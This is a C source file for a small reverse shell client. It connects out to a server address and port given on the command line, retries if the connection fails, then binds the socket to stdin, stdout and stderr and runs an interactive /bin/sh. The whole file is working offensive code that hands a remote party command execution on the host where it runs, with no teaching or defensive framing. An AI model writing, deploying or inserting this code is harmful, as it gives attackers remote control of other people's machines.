#include <arpa/inet.h>
#include <getopt.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "rsh.h"

#define DEFAULT_RETRY_INTERVAL  10
#define DEFAULT_RETRY_COUNT     100

static void usage(const char *progname) {
  RSH_LOG(
      "%sv%s\n%s\nUsage: %s [OPTIONS]\n\n"
      "OPTIONS\n"
      " -p <port>     Specify the port of the server\n"
      " -i <interval> Specify the retry interval for server connection\n"
      " -c <count>    Specify the retry count for server connection\n"
      " -s <addr>     Specify the server address\n"
      " -h            Show this message\n", BANNER, VERSION, FOOTER, progname);
}

static int parse_args(int argc, char *argv[], rsh_cfg_t *restrict cfg) {
  const char *short_opts = "p:s:i:c:h";
  int opt;

  while ((opt = getopt(argc, argv, short_opts)) != -1) {
    switch (opt) {
    case 'c':
      cfg->retry_count = atoi(optarg);
      break;
    case 'i':
      cfg->retry_interval = atoi(optarg);
      break;
    case 'p':
      cfg->port = htons(atoi(optarg));
      break;
    case 's':
      memcpy(cfg->ip, optarg, sizeof(cfg->ip) - 1);
      break;
    case 'h':
      return 1;
    }
  }

  if (!cfg->retry_interval) {
    cfg->retry_interval = DEFAULT_RETRY_INTERVAL;
  }

  if (!cfg->retry_count) {
    cfg->retry_count = DEFAULT_RETRY_COUNT;
  }

  if (!cfg->port || (cfg->ip[0] == '\0')) {
    return 1;
  }

  return 0;
}

static void exec_shell(int fd) {
  char *const cmd[] = { "/bin/sh", "-i", NULL };

  dup2(fd, STDIN_FILENO);
  dup2(fd, STDOUT_FILENO);
  dup2(fd, STDERR_FILENO);

  execv(cmd[0], cmd);
}

static int run(const rsh_cfg_t *restrict cfg) {
  struct sockaddr_in addr;
  int fd;

  if ((fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
    RSH_ERROR("Fail to create the communication socket!\n");
    return 1;
  }

  memset(&addr, 0, sizeof(struct sockaddr_in));

  addr.sin_family = AF_INET;
  addr.sin_port = cfg->port;
  inet_aton(cfg->ip, &addr.sin_addr);

  for (uint8_t i = 1; i <= cfg->retry_count; i++) {
    RSH_INFO("Trying to connect to server...%u of %u\n", i, cfg->retry_count);

    if (!connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr))) {
      RSH_INFO("Connection established!\n");
      exec_shell(fd);
    }

    RSH_ERROR("Fail to connect to server!trying again in %u secs\n",
              cfg->retry_interval);

    usleep(cfg->retry_interval * 1000000);
  }

  RSH_ERROR("Server unavailable, exiting...\n");

  return 1;
}

int main(int argc, char *argv[]) {
  rsh_cfg_t cfg;

  memset(&cfg, 0, sizeof(rsh_cfg_t));

  // parse the server ip and port
  if (parse_args(argc, argv, &cfg)) {
    usage(argv[0]);
    exit(EXIT_FAILURE);
  }

  // run the client
  int ret = run(&cfg);

  exit(ret);
}
